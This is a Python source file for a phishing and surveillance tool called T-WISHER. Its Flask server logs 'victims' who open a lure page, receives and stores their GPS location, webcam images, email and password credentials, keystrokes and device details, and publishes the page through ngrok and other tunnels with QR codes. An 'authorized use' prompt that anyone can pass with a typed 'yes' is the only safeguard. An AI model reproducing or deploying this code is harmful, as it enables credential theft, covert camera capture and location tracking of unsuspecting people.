#!/usr/bin/env python3
"""
T-WISHER - Advanced Surveillance & Intelligence Gathering Framework
PEGASUS TURBO v1.0
Author: XSPEEN | White Hacker/Red Team Community
"""

import os
import sys
import time
import json
import socket
import threading
import webbrowser
from datetime import datetime
import subprocess
import platform

# Third party imports
try:
    from flask import Flask, request, render_template, jsonify, send_file
    from flask_cors import CORS
    import requests
    import qrcode
    from PIL import Image
    from geopy.geocoders import Nominatim
    import colorama
    from colorama import Fore, Back, Style
    import pyfiglet
except ImportError as e:
    print(f"[!] Missing dependency: {e}")
    print("[!] Run: pip install -r requirements.txt")
    sys.exit(1)

# Initialize colorama
colorama.init(autoreset=True)

# Import custom modules
try:
    from modules.logger import Logger
    from modules.geo_location import GeoLocation
    from modules.camera_capture import CameraCapture
    from modules.tunnel_manager import TunnelManager
except ImportError as e:
    print(f"[!] Module import error: {e}")
    print("[!] Make sure you're in the T-WISHER directory")
    sys.exit(1)

# Configuration
app = Flask(__name__, 
            template_folder='templates',
            static_folder='static')
CORS(app)

# Global variables
VICTIMS = {}
logger = Logger()
geo = GeoLocation()
camera = CameraCapture()
tunnel = TunnelManager()

# Banner
def show_banner():
    """Display T-WISHER banner"""
    os.system('cls' if os.name == 'nt' else 'clear')
    
    banner_text = """
    ████████╗      ██╗    ██╗██╗███████╗██╗  ██╗███████╗██████╗ 
    ╚══██╔══╝      ██║    ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
       ██║   █████╗██║ █╗ ██║██║███████╗███████║█████╗  ██████╔╝
       ██║   ╚════╝██║███╗██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
       ██║         ╚███╔███╔╝██║███████║██║  ██║███████╗██║  ██║
       ╚═╝          ╚══╝╚══╝ ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
    """
    
    print(Fore.CYAN + "="*80)
    print(Fore.BLUE + banner_text)
    print(Fore.CYAN + "="*80)
    print(Fore.YELLOW + "            PEGASUS TURBO v1.0 - NUCLEAR FINDER")
    print(Fore.GREEN + "         MADE BY XSPEEN | WHITE HACKER/RED TEAM")
    print(Fore.CYAN + "="*80 + Style.RESET_ALL)
    print()

def check_terms():
    """Check if user accepts terms"""
    print(Fore.RED + "[!] WARNING: This is a SURVEILLANCE tool for AUTHORIZED use only!")
    print(Fore.RED + "[!] Unauthorized use is a FEDERAL CRIME!")
    print()
    print(Fore.YELLOW + "You MUST belong to ONE of these categories:")
    print("  1. Law Enforcement Official")
    print("  2. Authorized Red Team Member")
    print("  3. White Hat Hacker with Written Permission")
    print("  4. Security Researcher with Legal Authorization")
    print("  5. Government Intelligence Agency")
    print()
    
    choice = input(Fore.CYAN + "[?] Do you belong to authorized category? (yes/no): " + Style.RESET_ALL).lower().strip()
    
    if choice != 'yes':
        print(Fore.RED + "\n[!] Access Denied. Exiting...")
        sys.exit(0)
    
    print(Fore.GREEN + "\n[+] Terms accepted. Proceeding...")
    time.sleep(1)
    
    # Select category
    print(Fore.YELLOW + "\n[+] Select your authorization category:")
    print("  1. Law Enforcement Official")
    print("  2. Red Team Member (Authorized)")
    print("  3. White Hat Hacker (Written Consent)")
    print("  4. Security Researcher (Legal Authorization)")
    print("  5. Government Intelligence")
    
    cat_choice = input(Fore.CYAN + "[?] Enter category (1-5): " + Style.RESET_ALL).strip()
    
    categories = {
        '1': 'Law Enforcement',
        '2': 'Red Team',
        '3': 'White Hat',
        '4': 'Security Researcher',
        '5': 'Government Intelligence'
    }
    
    if cat_choice in categories:
        print(Fore.GREEN + f"[+] Authorized as: {categories[cat_choice]}")
        logger.log_event(f"User authorized as: {categories[cat_choice]}")
    else:
        print(Fore.RED + "[!] Invalid category. Defaulting to Red Team")
        logger.log_event("User authorized as: Red Team (default)")
    
    return True

def get_port():
    """Get port from user"""
    while True:
        try:
            port = input(Fore.CYAN + "\n[?] Enter port for hunt (default: 8080): " + Style.RESET_ALL).strip()
            if not port:
                return 8080
            port = int(port)
            if 1 <= port <= 65535:
                return port
            else:
                print(Fore.RED + "[!] Port must be between 1 and 65535")
        except ValueError:
            print(Fore.RED + "[!] Please enter a valid number")

def select_tunnel():
    """Select tunnel method"""
    print(Fore.YELLOW + "\n[+] Select tunnel method:")
    print("  1. Localhost (local network only)")
    print("  2. Ngrok (public URL)")
    print("  3. Serveo.net (SSH tunneling)")
    print("  4. Cloudflared Tunnel")
    print("  5. SSH Localhost.run")
    
    while True:
        choice = input(Fore.CYAN + "[?] Enter choice (1-5): " + Style.RESET_ALL).strip()
        if choice in ['1', '2', '3', '4', '5']:
            return choice
        else:
            print(Fore.RED + "[!] Please enter 1-5")

def generate_qr(url, filename):
    """Generate QR code for URL"""
    try:
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data(url)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        img.save(f"tunnel_qr_{filename}.png")
        print(Fore.GREEN + f"[+] QR Code saved: tunnel_qr_{filename}.png")
        return f"tunnel_qr_{filename}.png"
    except Exception as e:
        logger.log_error(f"QR generation failed: {e}")
        return None

# Flask Routes
@app.route('/')
def index():
    """Serve the main page"""
    victim_ip = request.remote_addr
    victim_id = str(int(time.time()))
    
    VICTIMS[victim_id] = {
        'ip': victim_ip,
        'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'user_agent': request.headers.get('User-Agent'),
        'data': {}
    }
    
    logger.log_event(f"New victim connected: {victim_ip} (ID: {victim_id})")
    
    try:
        return render_template('index.html', victim_id=victim_id)
    except Exception as e:
        logger.log_error(f"Template error: {e}")
        return "Template not found. Please check installation.", 500

@app.route('/api/location', methods=['POST'])
def receive_location():
    """Receive location data from victim"""
    data = request.json
    victim_id = data.get('victim_id')
    
    if victim_id in VICTIMS:
        VICTIMS[victim_id]['location'] = data
        VICTIMS[victim_id]['location']['timestamp'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Save to file
        filename = f"data/victims/victim_{victim_id}.json"
        with open(filename, 'w') as f:
            json.dump(VICTIMS[victim_id], f, indent=4)
        
        # Also save GPS separately
        gps_file = f"data/locations/gps_{victim_id}.txt"
        with open(gps_file, 'w') as f:
            f.write(f"Latitude: {data.get('latitude')}\n")
            f.write(f"Longitude: {data.get('longitude')}\n")
            f.write(f"Accuracy: {data.get('accuracy')}\n")
            f.write(f"Google Maps: https://maps.google.com/?q={data.get('latitude')},{data.get('longitude')}\n")
        
        # Display in console
        print(Fore.GREEN + f"\n[+] LOCATION CAPTURED from {VICTIMS[victim_id]['ip']}")
        print(Fore.YELLOW + f"    Latitude: {data.get('latitude')}")
        print(Fore.YELLOW + f"    Longitude: {data.get('longitude')}")
        print(Fore.CYAN + f"    Maps: https://maps.google.com/?q={data.get('latitude')},{data.get('longitude')}")
        
        logger.log_event(f"Location captured from {VICTIMS[victim_id]['ip']}: {data.get('latitude')},{data.get('longitude')}")
        
        return jsonify({'status': 'success'})
    
    return jsonify({'status': 'error'}), 400

@app.route('/api/camera', methods=['POST'])
def receive_camera():
    """Receive camera capture from victim"""
    data = request.json
    victim_id = data.get('victim_id')
    image_data = data.get('image')
    
    if victim_id in VICTIMS and image_data:
        # Save image
        import base64
        try:
            if ',' in image_data:
                image_bytes = base64.b64decode(image_data.split(',')[1])
            else:
                image_bytes = base64.b64decode(image_data)
            
            filename = f"data/images/cam_{victim_id}_{int(time.time())}.jpg"
            
            with open(filename, 'wb') as f:
                f.write(image_bytes)
            
            VICTIMS[victim_id]['camera'] = filename
            
            print(Fore.GREEN + f"\n[+] CAMERA CAPTURE from {VICTIMS[victim_id]['ip']}")
            print(Fore.YELLOW + f"    Image saved: {filename}")
            
            logger.log_event(f"Camera capture saved from {VICTIMS[victim_id]['ip']}: {filename}")
            
            return jsonify({'status': 'success'})
        except Exception as e:
            logger.log_error(f"Camera save error: {e}")
            return jsonify({'status': 'error'}), 400
    
    return jsonify({'status': 'error'}), 400

@app.route('/api/credentials', methods=['POST'])
def receive_credentials():
    """Receive login credentials from victim"""
    data = request.json
    victim_id = data.get('victim_id')
    
    if victim_id in VICTIMS:
        VICTIMS[victim_id]['credentials'] = {
            'email': data.get('email'),
            'password': data.get('password'),
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        
        # Save credentials
        cred_file = f"data/victims/creds_{victim_id}.txt"
        with open(cred_file, 'w') as f:
            f.write(f"Email: {data.get('email')}\n")
            f.write(f"Password: {data.get('password')}\n")
            f.write(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"IP: {VICTIMS[victim_id]['ip']}\n")
        
        print(Fore.RED + f"\n[+] CREDENTIALS CAPTURED from {VICTIMS[victim_id]['ip']}")
        print(Fore.WHITE + f"    Email: {data.get('email')}")
        print(Fore.WHITE + f"    Password: {data.get('password')}")
        print(Fore.YELLOW + f"    Saved to: {cred_file}")
        
        logger.log_event(f"Credentials captured from {VICTIMS[victim_id]['ip']}: {data.get('email')}")
        
        return jsonify({'status': 'success'})
    
    return jsonify({'status': 'error'}), 400

@app.route('/api/keylogger', methods=['POST'])
def receive_keylogger():
    """Receive keylogger data from victim"""
    data = request.json
    victim_id = data.get('victim_id')
    keys = data.get('keys')
    
    if victim_id in VICTIMS and keys:
        # Save keylogger data
        key_file = f"data/victims/keys_{victim_id}.txt"
        with open(key_file, 'a') as f:
            f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {keys}\n")
        
        VICTIMS[victim_id]['keylogger'] = key_file
        
        print(Fore.MAGENTA + f"\n[+] KEYSTROKE from {VICTIMS[victim_id]['ip']}: {keys}")
        
        return jsonify({'status': 'success'})
    
    return jsonify({'status': 'error'}), 400

@app.route('/api/device', methods=['POST'])
def receive_device():
    """Receive device info from victim"""
    data = request.json
    victim_id = data.get('victim_id')
    
    if victim_id in VICTIMS:
        VICTIMS[victim_id]['device'] = {
            'user_agent': data.get('userAgent'),
            'platform': data.get('platform'),
            'language': data.get('language'),
            'screen': data.get('screen'),
            'timezone': data.get('timezone'),
            'cookies_enabled': data.get('cookiesEnabled'),
            'do_not_track': data.get('doNotTrack')
        }
        
        print(Fore.BLUE + f"\n[+] DEVICE INFO from {VICTIMS[victim_id]['ip']}")
        print(Fore.CYAN + f"    Platform: {data.get('platform')}")
        print(Fore.CYAN + f"    Screen: {data.get('screen')}")
        print(Fore.CYAN + f"    Timezone: {data.get('timezone')}")
        
        return jsonify({'status': 'success'})
    
    return jsonify({'status': 'error'}), 400

def start_server(port):
    """Start Flask server"""
    print(Fore.GREEN + f"\n[+] T-WISHER hunt mode ACTIVE")
    print(Fore.GREEN + f"[+] Server running on port {port}")
    print(Fore.GREEN + f"[+] Local URL: http://localhost:{port}")
    
    # Get local IP
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        print(Fore.GREEN + f"[+] Local IP URL: http://{local_ip}:{port}")
    except:
        pass
    
    # Save local URL
    with open('logs/server_info.txt', 'w') as f:
        f.write(f"Local URL: http://localhost:{port}\n")
        f.write(f"Start time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    
    # Ask for tunnel
    tunnel_method = select_tunnel()
    
    if tunnel_method == '2':
        # Ngrok
        print(Fore.YELLOW + "[*] Starting ngrok tunnel...")
        public_url = tunnel.start_ngrok(port)
        if public_url:
            print(Fore.GREEN + f"[+] Ngrok URL: {public_url}")
            generate_qr(public_url, 'ngrok')
    
    elif tunnel_method == '3':
        # Serveo.net
        print(Fore.YELLOW + "[*] Starting Serveo.net tunnel (may take a moment)...")
        public_url = tunnel.start_serveo(port)
        if public_url:
            print(Fore.GREEN + f"[+] Serveo.net URL: {public_url}")
            generate_qr(public_url, 'serveo')
    
    elif tunnel_method == '4':
        # Cloudflared
        print(Fore.YELLOW + "[*] Starting Cloudflared tunnel...")
        public_url = tunnel.start_cloudflared(port)
        if public_url:
            print(Fore.GREEN + f"[+] Cloudflared URL: {public_url}")
            generate_qr(public_url, 'cloudflared')
    
    elif tunnel_method == '5':
        # SSH Localhost.run
        print(Fore.YELLOW + "[*] Starting SSH Localhost.run tunnel...")
        public_url = tunnel.start_ssh_local(port)
        if public_url:
            print(Fore.GREEN + f"[+] SSH Localhost.run URL: {public_url}")
            generate_qr(public_url, 'sshlocal')
    
    print(Fore.YELLOW + "\n[+] Waiting for victims...")
    print(Fore.YELLOW + "[+] Camera capture enabled")
    print(Fore.YELLOW + "[+] Location hijacking active")
    print(Fore.YELLOW + "[+] Keylogger running")
    print(Fore.CYAN + "-" * 60)
    
    # Start Flask
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

def monitor_victims():
    """Monitor victim activity"""
    while True:
        time.sleep(10)
        if VICTIMS:
            print(Fore.CYAN + f"\n[+] Active victims: {len(VICTIMS)}")
            for vid, data in list(VICTIMS.items())[-5:]:  # Show last 5
                status = []
                if 'location' in data:
                    status.append('📍')
                if 'camera' in data:
                    status.append('📸')
                if 'credentials' in data:
                    status.append('🔑')
                if 'keylogger' in data:
                    status.append('⌨️')
                
                status_str = ' '.join(status) if status else '🟢'
                print(Fore.WHITE + f"    {data['ip']} {status_str}")

def main():
    """Main function"""
    try:
        # Create directories
        os.makedirs('data/victims', exist_ok=True)
        os.makedirs('data/images', exist_ok=True)
        os.makedirs('data/locations', exist_ok=True)
        os.makedirs('logs', exist_ok=True)
        
        # Show banner
        show_banner()
        
        # Check terms
        check_terms()
        
        # Get port
        port = get_port()
        
        # Start monitor thread
        monitor_thread = threading.Thread(target=monitor_victims, daemon=True)
        monitor_thread.start()
        
        # Start server
        start_server(port)
        
    except KeyboardInterrupt:
        print(Fore.RED + "\n\n[!] T-WISHER shutting down...")
        logger.log_event("T-WISHER shutdown by user")
        
        # Summary
        print(Fore.YELLOW + f"\n[+] Total victims: {len(VICTIMS)}")
        for vid, data in VICTIMS.items():
            print(Fore.WHITE + f"    {data['ip']} - {data.get('first_seen', 'Unknown')}")
        
        sys.exit(0)
    
    except Exception as e:
        print(Fore.RED + f"\n[!] Error: {e}")
        logger.log_error(str(e))
        sys.exit(1)

if __name__ == '__main__':
    main()
